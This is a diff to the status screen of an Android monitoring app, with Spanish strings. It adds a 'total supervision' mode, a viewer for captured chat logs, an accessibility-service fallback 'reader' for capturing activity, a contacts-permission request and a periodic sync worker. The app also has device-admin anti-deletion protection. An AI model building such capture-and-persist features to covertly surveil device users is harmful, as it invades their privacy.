@@ -4,6 +4,7 @@ import android.app.admin.DevicePolicyManager
 import android.content.ComponentName
 import android.content.Context
 import android.content.Intent
+import android.content.pm.PackageManager
 import android.net.Uri
 import android.os.Bundle
 import android.provider.Settings
@@ -14,6 +15,12 @@ import android.widget.TextView
 import android.widget.Toast
 import androidx.appcompat.app.AlertDialog
 import androidx.appcompat.app.AppCompatActivity
+import androidx.core.app.ActivityCompat
+import androidx.core.content.ContextCompat
+import androidx.work.Constraints
+import androidx.work.NetworkType
+import androidx.work.PeriodicWorkRequestBuilder
+import androidx.work.WorkManager
 import com.google.android.material.card.MaterialCardView
 import com.google.android.material.materialswitch.MaterialSwitch
 import com.google.android.material.textfield.TextInputEditText
@@ -24,6 +31,7 @@ import kotlinx.coroutines.launch
 class StatusActivity : AppCompatActivity() {
 
     private val scope = CoroutineScope(Dispatchers.IO)
+    private val CONTACTS_PERMISSION_CODE = 101
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
@@ -40,6 +48,15 @@ class StatusActivity : AppCompatActivity() {
             val msg = if (isChecked) "Monitoreo REANUDADO" else "Monitoreo PAUSADO"
             Toast.makeText(this, msg, Toast.LENGTH_SHORT).show()
             updateUi()
+        }
+
+        // 1.5 Modo de Supervisión Total
+        val swTotalSupervision = findViewById<MaterialSwitch>(R.id.sw_total_supervision)
+        swTotalSupervision.isChecked = devicePrefs.getBoolean("total_supervision", false)
+        swTotalSupervision.setOnCheckedChangeListener { _, isChecked ->
+            devicePrefs.edit().putBoolean("total_supervision", isChecked).apply()
+            val msg = if (isChecked) "Supervisión TOTAL activada" else "Supervisión total desactivada"
+            Toast.makeText(this, msg, Toast.LENGTH_SHORT).show()
         }
 
         // 2. Gestión de Token
@@ -75,7 +92,11 @@ class StatusActivity : AppCompatActivity() {
             }
         }
 
-        // 4. Botón de Prueba
+        // 4. Botón de Prueba y Logs
+        findViewById<Button>(R.id.btn_view_logs).setOnClickListener {
+            startActivity(Intent(this, ChatLogActivity::class.java))
+        }
+
         findViewById<Button>(R.id.btn_test).setOnClickListener {
             Toast.makeText(this, "Enviando señal...", Toast.LENGTH_SHORT).show()
             val battery = DeviceStateHelper.getBatteryLevel(applicationContext)
@@ -100,6 +121,10 @@ class StatusActivity : AppCompatActivity() {
             startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
         }
 
+        findViewById<Button>(R.id.btn_accessibility).setOnClickListener {
+            startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
+        }
+
         findViewById<Button>(R.id.btn_app_info).setOnClickListener {
             openAppInfo()
         }
@@ -107,6 +132,10 @@ class StatusActivity : AppCompatActivity() {
         findViewById<Button>(R.id.btn_battery).setOnClickListener {
             val intent = Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS)
             startActivity(intent)
+        }
+
+        findViewById<Button>(R.id.btn_contacts).setOnClickListener {
+            checkAndRequestContactsPermission()
         }
 
         findViewById<Button>(R.id.btn_refresh_service).setOnClickListener {
@@ -122,7 +151,26 @@ class StatusActivity : AppCompatActivity() {
         // 6. Configuración por Marca (Samsung, Xiaomi, Motorola, Vivo)
         setupBrandOptimization()
 
+        // 7. Iniciar Sincronizador Offline (WorkManager)
+        setupSyncWorker()
+
         updateUi()
+    }
+
+    private fun setupSyncWorker() {
+        val constraints = Constraints.Builder()
+            .setRequiredNetworkType(NetworkType.CONNECTED)
+            .build()
+
+        val syncRequest = PeriodicWorkRequestBuilder<SyncWorker>(15, java.util.concurrent.TimeUnit.MINUTES)
+            .setConstraints(constraints)
+            .build()
+
+        WorkManager.getInstance(this).enqueueUniquePeriodicWork(
+            "SyncOfflineAlerts",
+            androidx.work.ExistingPeriodicWorkPolicy.KEEP,
+            syncRequest
+        )
     }
 
     private fun setupBrandOptimization() {
@@ -136,6 +184,25 @@ class StatusActivity : AppCompatActivity() {
         
         btnBrandSettings.setOnClickListener {
             ManufacturerHelper.openManufacturerSettings(this, brand)
+        }
+    }
+
+    private fun checkAndRequestContactsPermission() {
+        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
+            ActivityCompat.requestPermissions(this, arrayOf(android.Manifest.permission.READ_CONTACTS), CONTACTS_PERMISSION_CODE)
+        } else {
+            Toast.makeText(this, "Permiso de contactos ya concedido", Toast.LENGTH_SHORT).show()
+        }
+    }
+
+    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
+        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
+        if (requestCode == CONTACTS_PERMISSION_CODE) {
+            if (grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
+                Toast.makeText(this, "Permiso concedido correctamente", Toast.LENGTH_SHORT).show()
+            } else {
+                Toast.makeText(this, "Permiso denegado. Algunas funciones de privacidad no funcionarán.", Toast.LENGTH_LONG).show()
+            }
         }
     }
 
@@ -153,27 +220,41 @@ class StatusActivity : AppCompatActivity() {
         val isAdminActive = dpm.isAdminActive(componentName)
         val isServiceRunning = isNotificationServiceEnabled()
         val isServiceBound = NotificationCaptureService.isServiceBound
+        val isAccessibilityActive = BackupCaptureService.isServiceRunning
 
         // Banner de advertencia si no hay permiso
         val cardWarning = findViewById<MaterialCardView>(R.id.card_permission_warning)
-        cardWarning.visibility = if (isServiceRunning) View.GONE else View.VISIBLE
+        cardWarning.visibility = if (isServiceRunning || isAccessibilityActive) View.GONE else View.VISIBLE
 
         val tvStatus = findViewById<TextView>(R.id.tv_status)
         tvStatus.text = when {
-            !isServiceRunning -> "❌ Permiso de lectura bloqueado por Android"
+            !isServiceRunning && !isAccessibilityActive -> "❌ Ambos lectores bloqueados por Android"
+            !isServiceRunning && isAccessibilityActive -> "🛡️ Lector de respaldo activo (Accesibilidad)"
             !isServiceBound -> "⚠️ Permiso OK, pero el sistema aún no activa el servicio"
             isMonitoring -> "● El sistema está capturando actividad"
             else -> "○ El sistema está en pausa"
         }
+
+        val tvLastActivity = findViewById<TextView>(R.id.tv_last_activity)
+        val lastCapture = devicePrefs.getLong("last_capture_time", 0)
+        if (lastCapture > 0) {
+            val date = java.text.SimpleDateFormat("HH:mm:ss", java.util.Locale.getDefault()).format(java.util.Date(lastCapture))
+            tvLastActivity.text = "Última actividad detectada: $date"
+        }
         
         // Color dinámico según el estado
         val statusColor = when {
-            !isServiceRunning -> 0xFFEF4444.toInt()
+            !isServiceRunning && !isAccessibilityActive -> 0xFFEF4444.toInt()
+            !isServiceRunning && isAccessibilityActive -> 0xFF3B82F6.toInt()
             !isServiceBound -> 0xFFF59E0B.toInt()
             isMonitoring -> 0xFF10B981.toInt()
             else -> 0xFF6B7280.toInt()
         }
         tvStatus.setTextColor(statusColor)
+
+        val btnAccessibility = findViewById<Button>(R.id.btn_accessibility)
+        btnAccessibility.text = if (isAccessibilityActive) "LECTOR DE RESPALDO: ACTIVO" else "ACTIVAR LECTOR DE RESPALDO"
+        btnAccessibility.setTextColor(if (isAccessibilityActive) 0xFF10B981.toInt() else 0xFF6B7280.toInt())
 
         val btnAdmin = findViewById<Button>(R.id.btn_admin)
         btnAdmin.text = if (isAdminActive) "DESACTIVAR PROTECCIÓN ANTI-BORRADO" else "ACTIVAR PROTECCIÓN ANTI-BORRADO"
@@ -212,11 +293,6 @@ class StatusActivity : AppCompatActivity() {
         if (isNotificationServiceEnabled() && !NotificationCaptureService.isServiceBound) {
             NotificationCaptureService.forceRebind(this)
         }
-    }
-
-    override fun onStop() {
-        super.onStop()
-        PinActivity.isSessionUnlocked = false
     }
 
     override fun onResume() {
